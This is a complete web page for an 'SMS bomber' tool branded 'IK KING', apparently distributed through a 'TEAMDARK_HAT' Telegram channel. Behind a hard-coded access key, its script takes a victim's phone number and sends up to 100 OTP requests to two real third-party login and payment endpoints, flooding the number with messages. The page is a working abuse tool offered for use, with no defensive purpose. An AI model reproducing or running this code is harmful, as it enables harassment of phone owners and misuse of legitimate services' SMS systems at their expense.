<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SMS Boomer - IK KING</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Fira+Code&display=swap" rel="stylesheet">
  <script src="https://kit.fontawesome.com/a2e8b6f8b8.js" crossorigin="anonymous"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Orbitron', sans-serif;
      color: #e0f2fe;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      overflow: hidden;
      background: #000;
    }

    #matrixCanvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
      width: 100%;
      height: 100%;
      background: black;
    }

    .wrapper {
      width: 100%;
      max-width: 500px;
      background: rgba(15, 23, 42, 0.9);
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
      padding: 30px;
      position: relative;
      border: 2px solid rgba(0,255,0,0.2);
      backdrop-filter: blur(10px);
      animation: fadeIn 1s ease;
    }

    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 28px;
      background: linear-gradient(45deg, #0f0, #0ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #0f0;
      border-radius: 10px;
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      font-size: 1rem;
      font-family: 'Fira Code', monospace;
      transition: 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #0ff;
      background: rgba(255, 255, 255, 0.1);
    }

    .button {
      width: 100%;
      padding: 15px;
      margin-top: 10px;
      background: linear-gradient(90deg, #0f0, #0ff);
      border: none;
      border-radius: 50px;
      color: #000;
      font-weight: 700;
      cursor: pointer;
      transition: 0.4s;
      font-family: 'Orbitron', sans-serif;
    }

    .button:hover {
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
      transform: scale(1.03);
    }

    .status {
      margin-top: 15px;
      text-align: center;
      font-family: 'Fira Code', monospace;
      color: #0f0;
      font-size: 0.95rem;
    }

    .error {
      color: #ff4c4c;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @media (max-width: 600px) {
      h1 { font-size: 24px; }
    }

    .social {
      margin-top: 20px;
      text-align: center;
    }

    .social a {
      margin: 0 10px;
      color: #0ff;
      text-decoration: none;
      font-size: 18px;
    }

    .social a.whatsapp {
      color: #0f0;
    }
  </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>

<div class="wrapper" id="loginScreen">
  <h1>Access Verification</h1>
  <input type="password" id="accessKey" placeholder="Enter secret key...">
  <button class="button" onclick="checkKey()">Unlock Tool</button>
  <p id="loginError" class="status error" style="display:none;">‚ùå Invalid Key. Try Again.</p>
  <div class="social">
    <a href="https://t.me/TEAMDARK_HAT" target="_blank"><i class="fab fa-telegram"></i> Telegram</a>
    <a href="https://whatsapp.com/channel/0029VbAqaWNCRs1oqCTXRS3m" target="_blank" class="whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
  </div>
</div>

<div class="wrapper" id="mainScreen" style="display:none;">
  <h1>IK KING SMS BOMBER</h1>
  <input type="text" id="phone" placeholder="Phone Number (e.g. 923xx)">
  <input type="number" id="count" placeholder="OTP Count (1‚Äë100)" min="1" max="100">
  <button class="button" onclick="sendOTP()">üöÄ Send OTP</button>
  <p id="status" class="status"></p>
  <div class="social">
    <a href="https://t.me/TEAMDARK_HAT" target="_blank"><i class="fab fa-telegram"></i> Telegram</a>
    <a href="https://whatsapp.com/channel/0029VbAqaWNCRs1oqCTXRS3m" target="_blank" class="whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
  </div>
</div>

<script>
  const KEY = "IKKING804";

  function checkKey() {
    const keyInput = document.getElementById('accessKey').value.trim();
    const loginError = document.getElementById('loginError');

    if (keyInput === KEY) {
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('mainScreen').style.display = 'block';
    } else {
      loginError.style.display = 'block';
      setTimeout(() => loginError.style.display = 'none', 3000);
    }
  }

  async function sendOTP() {
    const phone = document.getElementById('phone').value.trim();
    const count = parseInt(document.getElementById('count').value);
    const status = document.getElementById('status');

    if (!phone || isNaN(count) || count < 1 || count > 100) {
      alert('üìµ Please enter a valid phone number and OTP count between 1‚Äì100.');
      return;
    }

    status.innerText = 'üîÑ Sending OTPs...';
    let requests = [];

    for (let i = 0; i < count; i++) {
      const url = i % 2 === 0
        ? `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`
        : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;

      const options = i % 2 === 1 ? {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'accept': 'application/json' },
        body: JSON.stringify({
          Version: 'V1',
          Language: 'en',
          Platform: 'web',
          ProductId: 1733,
          MobileNo: phone,
          OperatorId: '100007',
          URL: 'https://www.tapmad.com/sign-up',
          source: 'organic',
          medium: 'organic'
        })
      } : { method: 'POST' };

      requests.push(
        fetch(url, options).then(() => {
          status.innerText = `‚úÖ Sent ${i + 1} of ${count}`;
        }).catch(() => {
          status.innerText = `‚ö†Ô∏è Failed to send OTP ${i + 1}`;
        })
      );
    }

    await Promise.all(requests);
    status.innerText = '‚úÖ All OTPs Sent Successfully!';
  }

  const canvas = document.getElementById("matrixCanvas");
  const ctx = canvas.getContext("2d");

  canvas.height = window.innerHeight;
  canvas.width = window.innerWidth;

  let letters = "01";
  letters = letters.split("");

  let fontSize = 14;
  let columns = canvas.width / fontSize;
  let drops = [];
  for (let x = 0; x < columns; x++) drops[x] = 1;

  function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0f0";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
      let text = letters[Math.floor(Math.random() * letters.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(drawMatrix, 33);
</script>
</body>
</html>
